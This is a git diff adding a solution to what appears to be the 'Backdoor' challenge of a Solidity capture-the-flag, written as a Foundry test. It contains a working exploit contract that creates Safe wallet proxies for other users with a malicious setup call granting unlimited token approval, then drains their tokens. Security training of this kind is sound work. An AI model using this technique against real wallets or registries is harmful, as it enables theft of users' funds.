@@ -4,9 +4,13 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +74,11 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        // 1. Vulnerability with this is that the registry inherently trusts the owner of Safe. But when creating a proxy, i can make anyone's address the owner of the wallet
+        // 2. I will be able to spoof the owner of Alice-David and create wallets on their behalf
+        // 3. Gather all the funds within the proxies and transfer to the recovery 
+        BackdoorExploit exploit = new BackdoorExploit(recovery, users, address(walletRegistry), address(walletFactory));
+        exploit.exploit();
     }
 
     /**
@@ -92,5 +100,62 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract BackdoorExploit {
+    address recovery;
+    address[] users;
+    WalletRegistry walletRegistry;
+    SafeProxyFactory walletFactory;
+    IERC20 public immutable token;
+
+    constructor(address _recovery, address[] memory _users, address _walletRegistry, address _walletFactory) {
+        recovery = _recovery;
+        users = _users;
+        walletRegistry = WalletRegistry(_walletRegistry);
+        walletFactory = SafeProxyFactory(_walletFactory);
+        token = walletRegistry.token();
+    }
+
+    function exploit() external {
+        // 1. Create proxies for each user
+        for (uint256 i=0; i<4; ++i) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            bytes memory execTransaction = abi.encodeWithSignature(
+                "approveTokens(address,address)",
+                address(token),
+                address(this)
+            );
+
+             bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1,
+                    // address(maliciousApprover),
+                    address(this),
+                    execTransaction,
+                    address(0),
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
+
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                walletRegistry.singletonCopy(), 
+                initializer, 
+                i, 
+                walletRegistry
+            );
+            
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
+    }
+
+    function approveTokens(DamnValuableToken dvt, address spender) external {
+        dvt.approve(spender, type(uint256).max);
     }
 }
